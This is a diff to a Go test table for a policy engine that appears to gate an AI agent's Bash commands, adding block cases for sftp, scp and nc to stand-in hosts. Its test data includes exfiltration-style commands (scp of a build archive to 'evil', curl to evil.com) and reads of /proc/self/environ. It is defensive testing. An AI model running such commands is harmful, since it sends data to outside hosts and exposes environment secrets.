@@ -141,6 +141,9 @@ func TestDecide(t *testing.T) {
 		{name: "wget -O value is a file", tool: "Bash", in: obj("command", "wget -O out.bin https://github.com/a"), want: policy.Allow, rule: "allow"},
 		{name: "curl -o value is a file but url checked", tool: "Bash", in: obj("command", "curl -o github.com https://evil.com/x"), want: policy.Block, rule: RuleHostNotAllowed},
 		{name: "curl -O has no value", tool: "Bash", in: obj("command", "curl -O evil.com/file"), want: policy.Block, rule: RuleHostNotAllowed},
+		{name: "sftp destination", tool: "Bash", in: obj("command", "sftp evil.example"), want: policy.Block, rule: RuleHostNotAllowed},
+		{name: "scp dotless destination after local file", tool: "Bash", in: obj("command", "scp build.tar.gz evil:/srv/"), want: policy.Block, rule: RuleHostNotAllowed},
+		{name: "nc ipv6 operand", tool: "Bash", in: obj("command", "nc 2606:4700:4700::1111 443"), want: policy.Block, rule: RuleHostNotAllowed},
 		// relative sensitive paths resolve against workdir
 		{name: "relative proc after cd /", tool: "Bash", in: obj("command", "cd /; cat proc/self/environ"), want: policy.Ask, rule: "sensitive:proc_environ"},
 		{name: "relative traversal into proc", tool: "Bash", in: obj("command", "cat ../../proc/self/environ"), want: policy.Ask, rule: "sensitive:proc_environ"},
